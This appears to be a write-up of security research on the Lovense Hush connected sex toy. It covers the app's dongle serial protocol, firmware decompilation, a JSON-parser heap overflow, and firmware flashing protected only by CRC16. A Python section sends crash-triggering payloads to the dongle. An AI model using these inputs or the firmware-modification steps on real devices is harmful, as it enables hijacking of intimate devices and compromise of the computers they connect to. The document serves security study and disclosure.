# An Introduction to Teledildonics and Penetration Testing

## Overview
Teledildonics, derived from the Greek word "têle" (afar) and the English word "dildo," refers to technology that enables remote sexual stimulation. This document provides an in-depth look at the Lovense Hush, a teledildonic butt plug, and explores its security vulnerabilities through penetration testing.

## Use Scenarios
1. **Solo Play**: The user controls the device for personal use.
2. **Local Co-op**: Two users in the same physical location control the device together.
3. **Remote Co-op**: Users in different locations control the device via the internet.
4. **Remote Paid Co-op**: A paid service where one user controls the device for another over the internet.

## Compromise Scenarios
1. **Local Hijack**: Unauthorized access to the device by someone in the same physical location.
2. **Remote Hijack**: Unauthorized access to the device over the internet.
3. **Reverse Remote Hijack**: The device is used to compromise the controlling device or network.

## The Lovense Hush
- **Description**: The world's first teledildonic butt plug.
- **Control Methods**:
  - Mobile: iOS or Android
  - Desktop: Windows or Mac OS
- **Features**:
  - Social features including chat (text, pictures, video)
  - Sharing control with friends or strangers

## The Lovense Ecosystem
- **Lovense Remote App**
- **Toys**
- **USB Dongle**
- **BLE (Bluetooth Low Energy)**
- **Internet Connectivity**

## Compromise Map
- **Compromise Scenario #1**: Local Hijack
- **Compromise Scenario #2**: Remote Hijack
- **Compromise Scenario #3**: Reverse Remote Hijack

### Where to Start?
- **No Code/Binaries Available**: Initial challenges in obtaining the necessary code or binaries.
- **Binaries Available for Download**: Once binaries are obtained, further analysis can be conducted.

## Lovense Remote App
- **Requirements**: A Lovense account
- **Modes**:
  - Long-distance play
  - Local play control
- **Platform**: Runs on both Windows and Mac OS, built using Electron
- **Code Analysis**:
  - The app is written in JavaScript.
  - The code is obfuscated but field names are still present.
  - Using a beautifier, the code can be made more readable.
  - Example: Search for “dongle” to find relevant code segments.

### Dongle Protocol
- **Serial Communication**:
  ```javascript
  var t = new l.SerialPort(i.comName, {
    baudRate: e.dongleBaudRate.baudRate,
    dataBits: 8,
    parity: "none",
    stopBits: 1,
    flowControl: !1
  });
  ```
- **Command Types**:
  - Simple: `DeviceType;`
  - Complex: Encoded as JSON
- **Responses**:
  - Read 32 bytes at a time
  - After `DeviceType`, all responses are in JSON format

### Basic Functionality Replication
- **Python Script**:
  ```python
  import serial

  p = serial.Serial("COM3", 115200, timeout=1, bytesize=serial.EIGHTBITS,
                    parity=serial.PARITY_NONE, stopbits=serial.STOPBITS_ONE)

  p.write(b"DeviceType;\r\n")
  deviceType = p.readline()
  print(deviceType)

  p.write(b'{"type":"toy","func":"search"}\r\n')
  print(p.readline())

  p.write(b'{"type":"toy","func":"status"}\r\n')
  print(p.readline())

  p.write(b'{"type":"toy","func":"stopSearch"}\r\n')
  print(p.readline())

  p.write(b'{"type":"toy","func":"connect","eager":1,"id":"899208080A0A"}\r\n')
  print(p.readline())

  p.write(b'{"type":"toy","func":"command","id":"899208080A0A","cmd":"DeviceType;"}\r\n')
  print(p.readline())

  p.write(b'{"type":"toy","func":"command","id":"899208080A0A","cmd":"Battery;"}\r\n')
  print(p.readline())

  p.write(b'{"type":"toy","func":"command","id":"899208080A0A","cmd":"Vibrate:20;"}\r\n')
  print(p.readline())
  ```

### Firmware Update
- **Update URL**:
  ```javascript
  this.updateUrl = _configServer.LOGIN_SERVICE_URL + "/app/getUpdate/dfu?v="
  this.filename = "src/update/dongle.zip"
  this.exePath = "src\\update\\nrfutil.exe"
  ```
- **DFU Command**:
  ```json
  {
    "dfu": "DFU;",
    "oldDongleDFU": {
      "type": "usb",
      "cmd": "DFU"
    }
  }
  ```

### Firmware Analysis
- **Firmware File**:
  - `d1071.zip` from Lovense
  - Contains two binary blobs and one JSON file
  - No encryption, mostly versioning information
- **IDA Pro Analysis**:
  ```c
  void processLatestCommand() {
    if (receivedCommand_ == 1) {
      if (!processSimpleCommands_(latestCommand_)) {
        processComplexCommands_(latestCommand_);
      }
    }
  }

  bool processSimpleCommands_(char *a1) {
    if (memcmp(a1, "DFU;", 4u)) {
      if (!memcmp(a1, "RESET;", 6u)) {
        sendHostMessage_("OK;");
        SYSRESETREQ();
      }
      if (memcmp(a1, "DeviceType;", 0xBu)) {
        if (memcmp(a1, "GetBatch;", 9u)) return 0;
        sendHostMessage_("%02X%02X%02X;\n", batch0, batch1, batch2, batch3);
      } else {
        sendHostMessage_("%s:%s%s:%02X%02X%02X%02X%02X%02X;\n",
                         "D", "1", "05", deviceMac0, deviceMac1, deviceMac2, deviceMac3, deviceMac4, deviceMac5);
      }
    } else {
      sendHostMessage_("OK;");
      initiateDfu_();
    }
    return 1;
  }

  void processComplexCommands_(char *cmd) {
    jsonNode_s* node = parseJsonFromString_(cmd);
    if (!node) {
      sendHostError("402");
      return;
    }
    attribute_type = getJsonAttributeByName(node, "type");
    ...
  }
  ```

### Vulnerabilities
- **JSON Parser Bug**:
  - The parser handles escape characters but assumes they only skip one character.
  - This can lead to heap-based buffer overflows.
- **Heap-Based Buffer Overflow**:
  - Corrupts heap metadata, allowing arbitrary writes.
  - No ASLR, making exploitation easier.

### Hardware Analysis
- **NRF51822 SoC**:
  - Cortex-M0, 256KB flash, 16KB RAM
  - No DEP, no stack cookies
  - BLE-capable radio
  - Debuggable over SWD if not factory disabled

### Debugging the Dongle
- **SWD Test Points**: Exposed for debugging.
- **Crash Exploitation**:
  ```python
  bugdata = b"\u" + bytes([0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x78, 0x46, 0x5c, 0x00, 0x20])
  bugdata = b'{"type":"toy","test":"' + bugdata + b'"}\r\n'
  p.write(bugdata)
  print(p.readline())

  bugdata = b"\u" + bytes([0x00, 0x01, 0x02, 0x03, 0x04, 0x5c, 0x00, 0x5c, 0x00])
  bugdata = b'{"type":"toy","test":"' + bugdata + b'"}\r\n'
  p.write(bugdata)
  print(p.readline())

  bugdata = b"a" * 0x300
  bugdata = b'{"type":"toy","test":"' + bugdata + b'"}\r\n'
  p.write(bugdata)
  ```

### DFU Exploitation
- **DFU Package**:
  - Contains `main.bin` and `main.dat`
  - CRC16 for authentication
- **Modifying and Flashing**:
  - Modify `main.bin`, recalculate CRC16, and flash using Lovense Remote.
  - Reflash the Hush firmware using SWD test points.

### Conclusion
This document provides a comprehensive overview of the Lovense Hush and its security vulnerabilities. By understanding the hardware and software, we can identify and mitigate potential risks, ensuring a secure and enjoyable user experience.